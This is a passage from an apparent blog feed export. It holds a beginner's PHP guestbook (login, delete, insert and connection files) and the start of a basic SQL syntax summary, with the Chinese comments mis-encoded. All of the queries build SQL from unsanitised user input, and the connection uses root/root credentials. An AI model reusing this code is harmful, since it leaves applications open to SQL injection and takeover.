class="string">"è¾“å…¥åå­—è¿è§„ï¼ï¼"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   $user = $flag;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// var_dump($n-&gt;post($user)); </span></span><br><span class="line">  $time = time();   <span class="comment">//timeå‡½æ•°æ˜¯ç”¨æ¥è¡¨ç¤ºæ—¶é—´æˆ³ï¼Œä»1970å¹´å¼€å§‹ï¼Œä¹Ÿå°±æ˜¯1970ä¹‹å‰ä¸èƒ½è¡¨ç¤º</span></span><br><span class="line">  $sql = <span class="string">"insert into msg(content,user,intime) values('&#123;$content&#125;','&#123;$user&#125;','&#123;$time&#125;')"</span>;  </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  è¿™é‡Œç”¨èŠ±æ‹¬å·æ˜¯å› ä¸ºä½ åœ¨å•å¼•å·é‡Œé¢ä¸çŸ¥é“è¿™ä¸ª$åé¢è·Ÿç€çš„æ˜¯å˜é‡è¿˜æ˜¯å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//echo $sql;</span></span><br><span class="line"></span><br><span class="line">   $db-&gt;query(<span class="string">"SET NAMES UTF8"</span>); </span><br><span class="line">    <span class="comment">//ç¡®ä¿æ•°æ®ä¼ è¾“ä¹Ÿæ˜¯UTF-8ï¼Œé˜²æ­¢å‡ºç°ä¹±ç ï¼Œå¯èƒ½ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Œä½†æˆ‘å‘ç°æˆ‘åˆ é™¤ä¹‹åæ²¡å½±å“ï¼Œæœ€å¥½è¿˜æ˜¯äº›å†™å†™å§ï¼Œå°å¿ƒæ˜¯UTF8ï¼Œæ²¡æœ‰æ¨ªçº¿</span></span><br><span class="line"></span><br><span class="line">  $flag =  $db-&gt;query($sql);</span><br><span class="line">  <span class="keyword">if</span>($flag == <span class="keyword">true</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  header(<span class="string">"location:book.php"</span>);<span class="comment">//é‡å®šå‘</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'æ“ä½œå¤±è´¥ï¼'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//header("location:book.php");    </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>3.connect.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">æ­¤å¤„æ˜¯æ•°æ®åº“è¿æ¥çš„å…³é”®æ–‡ä»¶</span></span><br><span class="line"><span class="comment">æ¯æ¬¡æ‰§è¡Œsqléƒ½éœ€è¦è¿æ¥æ•°æ®åº“</span></span><br><span class="line"><span class="comment">å•ç‹¬å†™è¿›ä¸€ä¸ªæ–‡ä»¶åœ¨ç”¨æ–‡ä»¶åŒ…å«æ¯”è¾ƒæ–¹ä¾¿</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">  $host = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">  $dbuser = <span class="string">'root'</span>;</span><br><span class="line">  $pwd = <span class="string">'root'</span>;</span><br><span class="line">  $dbname = <span class="string">'php10'</span>;</span><br><span class="line"></span><br><span class="line">  $db = <span class="keyword">new</span> mysqli($host,$dbuser,$pwd,$dbname);</span><br><span class="line">  $db-&gt;query(<span class="string">'SET NAMES UTF8'</span>);</span><br><span class="line">  <span class="keyword">if</span>($db-&gt;connect_errno !=<span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'è¿æ¥å¤±è´¥ï¼'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>4.test3.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">æ­¤å¤„æ˜¯ç”¨äºè¾“å…¥çš„åˆ¤æ–­ï¼Œè¿™é‡Œçš„è¯•issetå‡½æ•°å¸®æˆ‘è§£å†³äº†é‚£ä¸ªUndefined index:çš„é”™è¯¯</span></span><br><span class="line"><span class="comment">è¿™é‡Œä¹Ÿè®©æˆ‘æ˜ç™½äº†è¿™ä¸ªPHPå‡½æ•°å¯ä»¥éšæ„è¿”å›ä¸œè¥¿ï¼Œä¸æƒ³C++é‚£æ ·åªèƒ½è¿”å›å¯¹åº”å‡½æ•°ç±»å‹çš„å€¼</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">input</span></span>&#123;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[$key]) === <span class="keyword">false</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">//ç¦æ­¢ä½¿ç”¨çš„ç”¨æˆ·å,ä»£ç æ¶æ„è¿‡æ»¤</span></span><br><span class="line">  $n = [<span class="string">'å¼ ä¸‰'</span>,<span class="string">'æå››'</span>,<span class="string">'ç‹äº”'</span>];</span><br><span class="line">      <span class="keyword">foreach</span>( $n <span class="keyword">as</span> $name)</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">if</span>($key == $name)</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      $val = $_POST[$key];</span><br><span class="line">      <span class="keyword">return</span> $val;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[$key]) === <span class="keyword">false</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//ç¦æ­¢ä½¿ç”¨çš„ç”¨æˆ·å,ä»£ç æ¶æ„è¿‡æ»¤</span></span><br><span class="line">  $val = $_GET[$key];</span><br><span class="line">      <span class="keyword">return</span> $val;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>5.mysql.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">æ­¤å¤„æ˜¯ç•™è¨€æ¿é¢œé¢æŸ¥è¯¢åŠŸèƒ½çš„å®ç°</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">'connect.php'</span>);</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from msg order by id DESC"</span>;</span><br><span class="line"><span class="comment">//æ‰§è¡ŒSQLè¯­å¥</span></span><br><span class="line">$mysqli_result = $db-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($mysqli_result === <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'æ“ä½œå¤±è´¥ï¼'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">fetch_arrayé¦–æ¬¡è°ƒç”¨æ˜¾ç¤ºæœ€æ–°çš„ä¸€æ¡è®°å½•</span></span><br><span class="line"><span class="comment">é‡å¤è°ƒç”¨ï¼Œä¾æ¬¡æ˜¾ç¤ºåé¢çš„è®°å½•</span></span><br><span class="line"><span class="comment">å¦‚æœæ²¡è®°å½•å¯æ˜¾ç¤ºï¼Œå°±è¿”å›NULL</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $c['id'];</span></span><br><span class="line"><span class="comment">// echo $c['content'];</span></span><br><span class="line"><span class="comment">// echo $c['user'];</span></span><br><span class="line"><span class="comment">// echo $c['intime'];  //æµ‹è¯•éƒ¨åˆ†ã€‚ã€‚è¿™é‡Œçš„$ç¬¦å·å¿˜è®°äº†å†™ï¼Œæ‰¾äº†å¾ˆä¹…æ‰æ‰¾å¾—åˆ°ï¼ŒåŸè°…æ–°æ‰‹O(âˆ©_âˆ©)O</span></span><br><span class="line"></span><br><span class="line">$d = [];</span><br><span class="line"><span class="keyword">while</span>($c = $mysqli_result-&gt;fetch_array(MYSQLI_ASSOC))  <span class="comment">//è¿™é‡Œçš„$cå˜é‡è¿ç”¨äº†ç±»å‹è½¬æ¢</span></span><br><span class="line">&#123;</span><br><span class="line">$d[] = $c;  </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">è¿™é‡Œçš„[]å¯ä»¥å¤©å¯ä»¥ä¸å¡«ï¼Œä¸å¡«çš„è¯ï¼Œå°±ä¼šè‡ªåŠ¨ç´¢å¼•ä»0å¼€å§‹ï¼Œå¹¶ä¸”æ˜¯ä¸ªäºŒç»´æ•°ç»„ï¼Œä¸€ç»´å¯¹åº”çš„å­—æ®µé”®å€¼ï¼Œå¦‚æœè‡ªå·±æƒ³å®šä¹‰å¯ä»¥è¿™æ ·$d[$c['id']] = $c;è¿™æ˜¯ä»¥idä¸ºé”®å€¼</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>6.login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç™»å½•åŠŸèƒ½çš„å®ç°</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    session_start();  <span class="comment">//sessionçš„ç”¨æ³•å…¶å®å°±æ˜¯ç›¸å½“ä¸ä¸€ä¸ªæ•°ç»„,å¯è·¨ç½‘é¡µä½¿ç”¨</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">'test3.php'</span>);</span><br><span class="line">$input = <span class="keyword">new</span> input();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> (<span class="string">'connect.php'</span>);</span><br><span class="line">$act = $input-&gt;get(<span class="string">'act'</span>);</span><br><span class="line"><span class="comment">//var_dump($act);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($act !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$username = $input-&gt;post(<span class="string">'username'</span>);</span><br><span class="line">$password = $input-&gt;post(<span class="string">'password'</span>);</span><br><span class="line"><span class="comment">//var_dump($username,$password);</span></span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">æŠŠä¸‹é¢è¿™ä¸€æ®µä»£ç æ”¾åœ¨å¤–é¢çš„è¯ï¼Œä¸€ç›´ä¼šçˆ†æœªå®šä¹‰å˜é‡çš„é”™è¯¯ï¼Œæ‰¾äº†å¾ˆä¹…æ‰å‘ç°å› è¯¥åœ¨é‡Œé¢å†™</span></span><br><span class="line"><span class="comment">è¯·åŸè°…æ–°æ‰‹ã€‚ã€‚ã€‚ã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">$sql = <span class="string">"select * from ada where username='&#123;$username&#125;' and password='&#123;$password&#125;'"</span>;</span><br><span class="line"></span><br><span class="line"> $mysqli_result = $db-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($row = $mysqli_result-&gt;fetch_array(MYSQLI_ASSOC))</span><br><span class="line"> &#123;</span><br><span class="line"> $_SESSION[<span class="string">'username'</span>] = $row[<span class="string">'username'</span>];</span><br><span class="line"> header(<span class="string">"Location:book.php"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">echo</span><span class="string">"ç™»é™†å¤±è´¥ï¼"</span>;</span><br><span class="line"> <span class="keyword">exit</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>/&gt;</span><br><span class="line">&lt;title&gt;ç®¡ç†å‘˜ç™»é™†&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action = <span class="string">'login.php?act=chk'</span> method=<span class="string">"post"</span>&gt;    &lt;!--getæ–¹æ³•çš„å˜é‡åªéœ€è¦åœ¨è¿™ä¸ªactioné‡Œé¢å®šä¹‰å³å¯--&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">'username'</span>/&gt;</span><br><span class="line">&lt;input type=<span class="string">'password'</span> name= <span class="string">'password'</span> /&gt;    &lt;!--typeæ”¹æˆpasswordå¯ä»¥éšè—æ˜æ–‡--&gt;</span><br><span class="line">&lt;input type=<span class="string">'submit'</span> value=<span class="string">'ç‚¹å‡»ç™»å½•'</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>7.delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">åˆ é™¤åŠŸèƒ½çš„å®ç°</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) ==<span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"éœ€è¦ç®¡ç†å‘˜æƒé™ï¼ï¼"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> (<span class="string">'test3.php'</span>);</span><br><span class="line">$input = <span class="keyword">new</span> input();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">$id = $input-&gt;get(<span class="string">'id'</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'connect.php'</span>);</span><br><span class="line">$sql = <span class="string">"delete from msg where id='&#123;$id&#125;'"</span>;</span><br><span class="line">$is = $db-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($is == <span class="keyword">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">"Location:book.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"åˆ é™¤å¤±è´¥ï¼ï¼"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å¯¹æ•°æ®åº“å­¦ä¹ çš„å¤§è‡´æ€»ç»“</title>
      <link href="/sql-Summary.html"/>
      <url>/sql-Summary.html</url>
      <content type="html"><![CDATA[<h2 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01  å‰è¨€"></a>0x01  å‰è¨€</h2><p>  èŠ±äº†ä¸¤å¤©æ—¶é—´ï¼Œäº†è§£äº†ä¸€ä¸‹æ•°æ®åº“çš„åŸºæœ¬è¯­æ³•ä»¥åŠæ“ä½œï¼Œçœ‹çš„æ˜¯SQLå¿…çŸ¥å¿…ä¼šè¿™æœ¬ä¹¦ï¼Œæ„Ÿè§‰è¿™æœ¬ä¹¦æ¯”è¾ƒè–„ï¼Œçœ‹èµ·æ¥ä¸åƒè¯¾æœ¬é‚£æ ·è¯¦ç»†ï¼Œæ‰€ä»¥æˆ‘æ€»ç»“çš„ä¹Ÿä¸å¤ªå…¨é¢ï¼Œè¯·å¤šå¤šåŒ…å«å§ã€‚ã€‚ã€‚ã€‚ã€‚</p><a id="more"></a><h2 id="0x02-æ­£æ–‡"><a href="#0x02-æ­£æ–‡" class="headerlink" title="0x02 æ­£æ–‡"></a>0x02 æ­£æ–‡</h2><h3 id="1-Navicatçš„ä½¿ç”¨"><a href="#1-Navicatçš„ä½¿ç”¨" class="headerlink" title="1 Navicatçš„ä½¿ç”¨"></a>1 Navicatçš„ä½¿ç”¨</h3><p> å¦‚æœä½ æ²¡æ¥è§¦è¿‡SQLï¼Œå¯ä»¥å…ˆç”¨è¿™æ¬¾è½¯ä»¶å»ç†Ÿæ‚‰ä¸€ä¸‹æ•°æ®åº“çš„ç»“æ„ï¼Œè¿™æ¬¾è½¯ä»¶åªè¦è¿æ¥å¥½æ•°æ®åº“å°±èƒ½ç”¨äº†ååˆ†æ–¹ä¾¿ï¼Œè¿˜èƒ½åœ¨é‡Œé¢ç»ƒä¹ SQLè¯­å¥ã€‚ã€‚ã€‚</p><h3 id="2-æ•°æ®åº“çš„ç»“æ„"><a href="#2-æ•°æ®åº“çš„ç»“æ„" class="headerlink" title="2 æ•°æ®åº“çš„ç»“æ„"></a>2 æ•°æ®åº“çš„ç»“æ„</h3><p>ä¸ªäººçœ‹äº†å‡ å¤©ä¹¦ï¼Œæˆ‘è®¤ä¸ºæ•°æ®åº“ä¸€èˆ¬éƒ½æ˜¯æŒ‰ç…§ä¸‹é¢çš„é¡ºåºå»æ“ä½œçš„ï¼šæ•°æ®åº“-&gt;è¡¨-&gt;å­—æ®µ(åˆ—)-&gt;è¡Œ</p><h3 id="3-æ•°æ®åº“çš„å„ç§è¯­å¥ä»¥åŠæ“ä½œ"><a href="#3-æ•°æ®åº“çš„å„ç§è¯­å¥ä»¥åŠæ“ä½œ" class="headerlink" title="3 æ•°æ®åº“çš„å„ç§è¯­å¥ä»¥åŠæ“ä½œ"></a>3 æ•°æ®åº“çš„å„ç§è¯­å¥ä»¥åŠæ“ä½œ</h3><h4 id="3-1-æ³¨é‡Š"><a href="#3-1-æ³¨é‡Š" class="headerlink" title="3.1 æ³¨é‡Š"></a>3.1 æ³¨é‡Š</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.#   </span><br><span class="line">2.--       </span><br><span class="line">3./*   */       </span><br><span class="line">ï¼ˆå‰ä¸¤ä¸ªéƒ½æ˜¯å•è¡Œæ³¨é‡Šï¼Œæ³¨æ„åŒæ–œæ åé¢æœ‰ç©ºæ ¼ï¼Œç¬¬ä¸‰ä¸ªæ˜¯å¤šè¡Œæ³¨é‡Šï¼‰</span><br></pre></td></tr></table></figure><h4 id="3-2-åˆ›å»ºæ•°æ®åº“"><a href="#3-2-åˆ›å»ºæ•°æ®åº“" class="headerlink" title="3.2 åˆ›å»ºæ•°æ®åº“"></a>3.2 åˆ›å»ºæ•°æ®åº“</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> æ•°æ®åº“åç§°;</span><br></pre></td></tr></table></figure><h4 id="3-3-æŸ¥çœ‹æ•°æ®åº“"><a href="#3-3-æŸ¥çœ‹æ•°æ®åº“" class="headerlink" title="3.3 æŸ¥çœ‹æ•°æ®åº“"></a>3.3 æŸ¥çœ‹æ•°æ®åº“</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure><h4 id="3-4-åˆ‡æ¢æ•°æ®åº“"><a href="#3-4-åˆ‡æ¢æ•°æ®åº“" class="headerlink" title="3.4 åˆ‡æ¢æ•°æ®åº“"></a>3.4 åˆ‡æ¢æ•°æ®åº“</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">USE</span> æ•°æ®åº“å;</span><br></pre></td></tr></table></figure><p>####3.5 åˆ é™¤æ•°æ®åº“</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> æ•°æ®åº“å;</span><br></pre></td></tr></table></figure><p><code>æ³¨æ„</code> SQLè¯­å¥å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œå¹¶ä¸”ä»¥åˆ†å·ä½œä¸ºè¯­å¥çš„ç»“æŸ</p><h4 id="3-6-åˆ›å»ºæ•°æ®è¡¨"><a href="#3-6-åˆ›å»ºæ•°æ®è¡¨" class="headerlink" title="3.6 åˆ›å»ºæ•°æ®è¡¨"></a>3.6 åˆ›å»ºæ•°æ®è¡¨</h4><p>å¦‚ï¼š<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> teacher(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">4</span>) <span class="keyword">not</span> <span class="literal">null</span> primary <span class="keyword">key</span> auto_increment,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">sex <span class="built_in">char</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">addr <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>####3.7 æŸ¥çœ‹æ•°æ®è¡¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure><h4 id="3-8-æ’å…¥æ•°æ®è¡¨"><a href="#3-8-æ’å…¥æ•°æ®è¡¨" class="headerlink" title="3.8 æ’å…¥æ•°æ®è¡¨"></a>3.8 æ’å…¥æ•°æ®è¡¨</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">INTO</span> teacher(<span class="keyword">name</span>,sex,addr)</span><br><span class="line"><span class="keyword">values</span>(<span class="string">'Leo'</span>,<span class="string">'Male'</span>,<span class="string">'hangzhou'</span>);</span><br></pre></td></tr></table></figure><h4 id="3-9-æŸ¥è¯¢æ•°æ®è¡¨"><a href="#3-9-æŸ¥è¯¢æ•°æ®è¡¨" class="headerlink" title="3.9 æŸ¥è¯¢æ•°æ®è¡¨"></a>3.9 æŸ¥è¯¢æ•°æ®è¡¨</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> teacher;</span><br></pre></td></tr></table></figure><p>è¦æœç´¢å¤šä¸ªåˆ—ç”¨é€—å·éš”å¼€ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">user</span> <span class="keyword">from</span> teacher;   <span 